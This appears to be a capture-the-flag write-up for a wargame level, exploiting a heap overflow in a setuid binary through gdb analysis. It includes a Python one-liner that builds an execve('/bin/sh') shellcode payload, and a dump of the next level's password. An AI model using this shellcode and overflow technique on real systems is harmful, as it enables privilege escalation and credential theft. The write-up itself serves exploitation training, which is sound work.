# level9

```sh
$> ls -l ~
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
```

We'll execute a simple shellcode to get the flag.  

We first need to find the address of the buffer.  
Since I didn't find it using the process I usually do in C, I'll do a breakpoint
just before the call to `memcpy()` to retrieve it.

```sh
$> gdb -q level9
(gdb) disas _ZN1N13setAnnotationEPc
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:	push   %ebp
   0x0804870f <+1>:	mov    %esp,%ebp
   0x08048711 <+3>:	sub    $0x18,%esp
   0x08048714 <+6>:	mov    0xc(%ebp),%eax
   0x08048717 <+9>:	mov    %eax,(%esp)
   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
   0x0804871f <+17>:	mov    0x8(%ebp),%edx
   0x08048722 <+20>:	add    $0x4,%edx
   0x08048725 <+23>:	mov    %eax,0x8(%esp)
   0x08048729 <+27>:	mov    0xc(%ebp),%eax
   0x0804872c <+30>:	mov    %eax,0x4(%esp)
   0x08048730 <+34>:	mov    %edx,(%esp)
   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:	leave  
   0x08048739 <+43>:	ret    
End of assembler dump.
(gdb) b *0x08048733
Breakpoint 1 at 0x8048733
(gdb) r "AAAA"
Starting program: /home/user/level9/level9 "AAAA"

Breakpoint 1, 0x08048733 in N::setAnnotation(char*) ()
(gdb) p/x $edx
$1 = 0x804a00c
(gdb) x/32x $edx
0x804a00c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a01c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a02c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a03c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a04c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a05c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a06c:	0x00000000	0x00000005	0x00000071	0x08048848
0x804a07c:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x 0x804a06c + 12
0x804a078:	0x08048848
```

The address of the buffer is `0x804a00c`, and we can also see the return address (`0x804a078`) we'll overwrite.

The structure of the payload is as follows:
- 4 bytes for the address to our payload -> `0x0804a00c + 0x4 = 0x0804a010` -> `\x10\xa0\x04\x08`
- 21 bytes for the shellcode which executes `execve('/bin/sh')` -> `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`
- 83 bytes of padding with `\x90` (noop)
- 4 bytes to overwrite the return address to the start of the buffer -> `0x804a00c` -> `\x0c\xa0\x04\x08`

```sh
$> python -c 'print("\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*83 + "\x0c\xa0\x04\x08")' > /tmp/payload

$> ./level9 $(cat /tmp/payload)
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
